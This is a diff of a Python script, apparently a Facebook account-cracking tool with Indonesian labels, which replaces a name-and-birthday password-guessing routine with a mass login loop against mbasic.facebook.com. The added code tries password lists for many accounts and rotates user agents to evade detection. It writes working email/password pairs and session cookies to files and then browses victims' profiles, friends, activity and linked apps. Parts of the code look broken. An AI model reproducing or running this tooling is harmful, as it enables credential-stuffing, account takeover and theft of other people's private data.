@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 from multiprocessing.pool import ThreadPool
+import sys
 import requests,json,os,random,datetime,time,re
 from concurrent.futures import ThreadPoolExecutor as Tree
 from concurrent.futures import ThreadPoolExecutor
@@ -10,7 +11,10 @@ from rich.console import Console
 from rich.columns import Columns
 from rich.panel import Panel as panel
 from rich.console import Console as sol
+from rich.panel import Panel as nel
+from rich import print as cetak
 import urllib3
+import parser
 try:
     open('ua.txt','r').read()
 except:
@@ -20,7 +24,40 @@ try:ugen = open('ua.txt','r').read().splitlines()
 except:ugen = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
 try:ugen2 = open('ua.txt','r').read().splitlines()
 except:ugen2 = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
-
+x = '\33[m' # DEFAULT
+k = '\033[93m' # KUNING +
+h = '\x1b[1;92m' # HIJAU +
+hh = '\033[32m' # HIJAU -
+u = '\033[95m' # UNGU
+kk = '\033[33m' # KUNING -
+b = '\33[1;96m' # BIRU -
+p = '\x1b[0;34m' # BIRU +
+P = '\033[0;00m'
+J = '\033[0;33m'
+S = '\033[0;00m'
+N = '\x1b[0m'
+I ='\033[0;32m'
+C ='\033[0;36m'
+M ='\033[0;31m'
+U ='\033[0;35m'
+K ='\033[0;33m'
+P='\033[00m'
+h='\033[0;90m'
+Q="\033[00m"
+kk='\033[0;32m'
+ff='\033[0;36m'
+G='\033[0;36m'
+p='\033[00m'
+h='\033[0;90m'
+Q="\033[00m"
+I='\033[0;32m'
+II='\033[0;36m'
+m='\033[0;31m'
+O ='\033[0;33m'
+H='\033[0;33m'
+b = '\033[0;36m'
+war = "[•]"
+B = random.choice([U,I,K,b,M])
 pretty.install()
 CON=sol()
 wa = Console()
@@ -322,74 +359,129 @@ class crack:
                     V.submit(self.main, Dump, self.email, self.password)
             Console().print("\r[bold white][[bold green]Selesai[bold white]]                           ");exit()
         except:exit()
-    ### MAIN ###
-    def main(self, total, email, password):
+def main(self, total, email, password):
+    global loop,ok,cp
+    bi = random.choice([u,k,kk,b,h,hh])
+    pers = loop*100/len(id2)
+    fff = '%'
+    print('\r%s >°< %s/%s <-> OK:%s <-> CP:%s <-> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
+    ua = random.choice(ugen)
+    ua2 = random.choice(ugen2)
+    ses = requests.Session()
+    for pw in password:
+        self.useragent = self.realme_useragent(total = 1)
         try:
-            for pws in password:
-                self.useragent = self.realme_useragent(total = 1)
-            with requests.Session() as r:
-                a = requests.get('https://graph.facebook.com/' + email + '/?access_token=' +tokenku)
-                b = json.loads(a.text)
-                
-                pass1 = b['first_name'] + '123'
-                data = urllib3.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                q = json.load(data)
-                if 'access_token' in q:
-                    print('Email :' + email + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass1)
-                elif 'www.facebook.com' in q['error_msg']:
-                    print('Email : ' + email + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass1)
+            tix = time.time()
+            ses.headers.update({"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+            p = ses.get('https://mbasic.facebook.com/login/?email='+email).text
+            dataa ={
+'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
+'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
+'m_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
+'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
+'email':email,
+'pass':pw
+}
+            ses.headers.update({'Host': 'mbasic.facebook.com',
+'cache-control': 'max-age=0',
+'upgrade-insecure-requests': '1',
+'origin': 'https://mbasic.facebook.com',
+'content-type': 'application/x-www-form-urlencoded',
+'user-agent': ua,
+'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+'sec-fetch-site': 'same-origin',
+'sec-fetch-mode': 'cors',
+'sec-fetch-user': 'empty',
+'sec-fetch-dest': 'document',
+'referer': 'https://mbasic.facebook.com/login/?email='+email,
+'accept-encoding':'gzip, deflate br',
+'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
+            po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
+            if "checkpoint" in po.cookies.get_dict().keys():
+                if 'ya' in oprek:
+                    akun.append(email+'|'+pw)
+                    ceker(email,pw)
                 else:
+                    print('\n')
+                    statuscp = f'[•] ID : {email} [•] PASSWORD : {pw}'
+                    statuscp1 = nel(statuscp, style='red')
+                    cetak(nel(statuscp1, title='SESI'))
+                    open('CP/'+cpc,'a').write(email+'|'+pw+'\n')
+                    akun.append(email+'|'+pw)
+                    cp+=1
+                    break
+            elif "c_user" in ses.cookies.get_dict().keys():
+                if 'no'in taplikasi:
+                    ok+=1
+                    coki=po.cookies.get_dict()
+                    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+                    open('OK/'+okc,'a').write(email+'|'+pw+'|'+kuki+'\n')
+                    print('\n')
+                    statusok = f'[OK]       : {email}\n[OK] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n{infoakun}'   
+                elif 'ya'in taplikasi:
+                    ok+=1
+                    coki=po.cookies.get_dict()
+                    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+                    open('OK/'+okc,'a').write(email+'|'+pw+'|'+kuki+'\n')
+                    user=email
+                    infoakun = ""
+                    session = requests.Session()
+                    get_id = session.get("https://m.facebook.com/profile.php",cookies=coki).text
+                    response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki).text
+                    response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki).text
+                    response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki).text
+                    response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki).text
                     
-                    pass2 = b['first_name'] + '12345'
-                    data = urllib3.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                    q = json.load(data)
-                    if 'access_token' in q:
-                        print('\n\x1b[1;95m Email : ' + email + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass2)
-                    elif 'www.facebook.com' in q['error_msg']:
-                        print('\n\x1b[1;91m Email :\x1b[1;97m ' + email + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass2)
-                    else:
-                        pass3 = b['last_name'] + '123'
-                        data = urllib3.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                        q = json.load(data)
-                        if 'access_token' in q:
-                            print('\n\x1b[1;95m Email :\x1b[1;97m ' + email + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass3)
-                        elif 'www.facebook.com' in q['error_msg']:
-                            print('\n\x1b[1;91m Email :\x1b[1;97m ' + email + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass3)
+                    hit1, hit2 = 0,0
+                    cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki).text
+                    cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki).text
+                    if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
+                        infoakun += (f"Aplikasi Yang Terkait*\n")
+                        if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
+                            infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
                         else:
-                            birth = b['birthday']
-                            pass4 = birth.replace('/', '')
-                            data = urllib3.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                            q = json.load(data)
-                            if 'access_token' in q:
-                                print ('\n\x1b[1;91m Email :\x1b[1;97m ' + email + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass4)
-                            elif 'www.facebook.com' in q['error_msg']:
-                                print ('\n\x1b[1;91m Email :\x1b[1;97m ' + email + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass4)
-                            else:
-                                pass5 = b['last_name'] + '04'
-                                data = urllib3.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                                q = json.load(data)
-                                if 'access_token' in q:
-                                    print ('\n\x1b[1;91m Email :\x1b[1;97m ' + email + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass5)
-                                elif 'www.facebook.com' in q['error_msg']:
-                                    print ('\n\x1b[1;91m Email :\x1b[1;97m ' + email + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass5)
-                                else:
-                                    pass6 = b['first_name'] + '04'
-                                    data = urllib3.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
-                                    q = json.load(data)
-                                    if 'access_token' in q:
-                                        print ('\n\x1b[1;91m Email :\x1b[1;97m ' + email + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass6)
-                                    elif 'www.facebook.com' in q['error_msg']:
-                                        print ('\n\x1b[1;91m Email :\x1b[1;97m ' + email + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass6)
-                                    else:
-                                        pass
-                            		
-        except:
-            pass
+                            infoakun += (f"	—_Aplikasi Aktif : \n")
+                            infoakun += (f"	—_Aplikasi Kedaluwarsa : \n")
+                    else:
+                        pass
+                        print('\n')
+                        statusok = f'[CP]       : {email}\n[CP] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n{infoakun}'
+                else:
+                    continue
+        except requests.exceptions.ConnectionError:
+            time.sleep(31)
+            loop+=1
+            
+def ceker(email,pw):
+    global cp
+    ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
+    head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+    ses = requests.Session()
+    try:
+        hi = ses.get('https://mbasic.facebook.com')
+        ho = parser(ses.post('https://mbasic.facebook.com/login.php', data={'email':email,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
+        jo = ho.find('form')
+        data = {}
+        lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
+        for anj in jo('input'):
+            if anj.get('name') in lion:
+                data.update({anj.get('name'):anj.get('value')})
+                kent = parser(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
+        print('\r%s++++ %s|%s ----> CP       %s'%(b,email,pw,x))
+        open('Results/'+Cp,'a').write(email+'|'+pw+'\n')
+        cp+=1
+        opsi = kent.find_all('option')
+        if len(opsi)==0:
+            print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
+        else:
+            for opsii in opsi:
+                print('\r%s---> %s%s'%(kk,opsii.text,x))
+    except Exception as c:
+        print('\r%s++++ %s|%s ----> CP       %s'%(b,email,pw,x))
+        print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
+        open('Results/'+Cp,'a').write(email+'|'+pw+'\n')
+        cp+=1
 
-    p = ThreadPool(30)
-    p.map(main, id)
-    print('\n\x1b[1;91m[+] \x1b[1;97mFinish')
-    daftar_menu();time.sleep(3)
     
     ### REALME USERAGENT ###
     def realme_useragent(self, total):
